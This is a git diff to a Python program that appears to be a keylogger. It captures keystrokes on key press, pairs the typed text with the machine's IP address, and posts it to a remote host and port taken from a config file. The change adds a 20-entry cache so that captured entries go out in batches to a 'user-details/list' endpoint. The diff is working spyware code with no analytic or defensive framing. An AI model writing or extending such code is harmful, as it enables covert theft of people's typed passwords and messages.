@@ -6,6 +6,9 @@ from configparser import SafeConfigParser
 
 currentString = ''
 
+cache = []
+cache_size = 20
+
 
 def append_string(character):
     global currentString
@@ -52,12 +55,48 @@ def post_message(message: UserDetails):
     post(url="http://{}:{}/{}".format(host, port, endpoint), json=message.to_json())
 
 
+def post_details_list(details_list: list):
+    host, port = get_destination_url()
+    endpoint = 'user-details'
+    post(url="http://{}:{}/{}/list".format(host, port, endpoint), json=get_details_as_dict_list(details_list))
+
+
+def get_details_as_dict_list(details_list: list):
+    result = []
+    for details in details_list:
+        result.append(details.__dict__)
+    return result
+
+
+def get_details_as_json(details_list: list):
+    json = '['
+
+    for details in details_list:
+        json += details.to_json()
+        json += ', '
+    return json[0:len(json) - 2] + ']'
+
+
 def send_message(message):
     if message == '' or message is None: return
     ip = get_ip_address()
     user_details = UserDetails(ip, message)
     print('Sent {}'.format(user_details.to_json()))
-    post_message(user_details)
+    add_to_cache(user_details)
+
+
+def clear_cache():
+    global cache
+    cache = []
+
+
+def add_to_cache(details: UserDetails):
+    global cache
+    global cache_size
+    cache.append(details)
+    if len(cache) > cache_size:
+        post_details_list(cache)
+        clear_cache()
 
 
 def on_press(key):
